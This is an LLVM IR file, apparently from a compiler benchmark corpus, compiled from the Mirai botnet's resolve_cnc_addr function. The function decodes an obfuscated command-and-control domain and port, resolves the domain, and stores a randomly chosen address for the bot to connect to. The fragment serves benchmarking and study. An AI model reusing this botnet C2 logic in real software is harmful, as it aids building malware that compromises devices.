; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_main.c_resolve_cnc_addr.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_main.c_resolve_cnc_addr.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i32 }
%struct.resolv_entries = type { i64, i32* }

@TABLE_CNC_DOMAIN = common dso_local global i32 0, align 4
@srv_addr = common dso_local global %struct.TYPE_4__ zeroinitializer, align 4
@TABLE_CNC_PORT = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (void ()* @resolve_cnc_addr to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @resolve_cnc_addr() #0 {
  %1 = alloca %struct.resolv_entries*, align 8
  %2 = load i32, i32* @TABLE_CNC_DOMAIN, align 4
  %3 = call i32 @table_unlock_val(i32 %2)
  %4 = load i32, i32* @TABLE_CNC_DOMAIN, align 4
  %5 = call i64 @table_retrieve_val(i32 %4, i32* null)
  %6 = call %struct.resolv_entries* @resolv_lookup(i64 %5)
  store %struct.resolv_entries* %6, %struct.resolv_entries** %1, align 8
  %7 = load i32, i32* @TABLE_CNC_DOMAIN, align 4
  %8 = call i32 @table_lock_val(i32 %7)
  %9 = load %struct.resolv_entries*, %struct.resolv_entries** %1, align 8
  %10 = icmp eq %struct.resolv_entries* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %0
  br label %33

12:                                               ; preds = %0
  %13 = load %struct.resolv_entries*, %struct.resolv_entries** %1, align 8
  %14 = getelementptr inbounds %struct.resolv_entries, %struct.resolv_entries* %13, i32 0, i32 1
  %15 = load i32*, i32** %14, align 8
  %16 = call i64 (...) @rand_next()
  %17 = load %struct.resolv_entries*, %struct.resolv_entries** %1, align 8
  %18 = getelementptr inbounds %struct.resolv_entries, %struct.resolv_entries* %17, i32 0, i32 0
  %19 = load i64, i64* %18, align 8
  %20 = urem i64 %16, %19
  %21 = getelementptr inbounds i32, i32* %15, i64 %20
  %22 = load i32, i32* %21, align 4
  store i32 %22, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @srv_addr, i32 0, i32 1, i32 0), align 4
  %23 = load %struct.resolv_entries*, %struct.resolv_entries** %1, align 8
  %24 = call i32 @resolv_entries_free(%struct.resolv_entries* %23)
  %25 = load i32, i32* @TABLE_CNC_PORT, align 4
  %26 = call i32 @table_unlock_val(i32 %25)
  %27 = load i32, i32* @TABLE_CNC_PORT, align 4
  %28 = call i64 @table_retrieve_val(i32 %27, i32* null)
  %29 = inttoptr i64 %28 to i32*
  %30 = load i32, i32* %29, align 4
  store i32 %30, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @srv_addr, i32 0, i32 0), align 4
  %31 = load i32, i32* @TABLE_CNC_PORT, align 4
  %32 = call i32 @table_lock_val(i32 %31)
  br label %33

33:                                               ; preds = %12, %11
  ret void
}

declare dso_local i32 @table_unlock_val(i32) #1

declare dso_local %struct.resolv_entries* @resolv_lookup(i64) #1

declare dso_local i64 @table_retrieve_val(i32, i32*) #1

declare dso_local i32 @table_lock_val(i32) #1

declare dso_local i64 @rand_next(...) #1

declare dso_local i32 @resolv_entries_free(%struct.resolv_entries*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
